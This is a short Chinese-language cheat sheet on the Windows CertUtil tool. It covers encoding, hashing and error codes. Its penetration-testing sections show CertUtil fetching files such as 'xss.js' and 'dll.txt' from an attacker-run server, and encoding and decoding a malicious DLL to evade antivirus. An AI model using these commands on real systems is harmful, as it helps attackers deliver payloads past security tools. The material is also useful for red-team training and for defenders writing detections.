## 编码 解码 base64

```powershell
CertUtil -encode test.txt encode.txt
type .\encode.txt

CertUtil -decode encode.txt decode.txt
type .\decode.txt
```



## 编码 十六进制

```powershell
CertUtil -encodehex .\abc.ps1 encode2.txt
type .\encode2.txt

CertUtil -decodehex  encode2.txt decode2.txt
 type .\decode2.txt
```



## 散列

MD5，SHA-1，SHA-256

```powershell
CertUtil -hashfile test.txt md5
```

## 下载

```powershell
CertUtil.exe -urlcache -split -f http://服务器ip:8000/xss.js
```

### 使用Certutil进行渗透测试

>Certutil可在未经任何验证或评估的情况下主动从Internet下载文件

### 提交恶意DLL编码

>Certutil可对文件进行base64编码，攻击者可以使用经过混淆的文件来隐藏扫描攻击的证据，然后再解码这些文件，这就是certutil发挥作用的地方，可以解码数据并避免杀毒软件的察觉。Certutil还可以用于解码已隐藏在证书文件中的可移植可执行文件。
有效载荷可以被编码或加密，以避免被检测

```powershell
CertUtil -urlcache -split -f http://192.168.211.129:8000/dll.txt | certutil -encode dll.txt edll.txt

CertUtil -decode .\edll.txt exploit.dll
```

## 系统错误代码

```powershell
CertUtil -error 8200

CertUtil -error 0x200
```

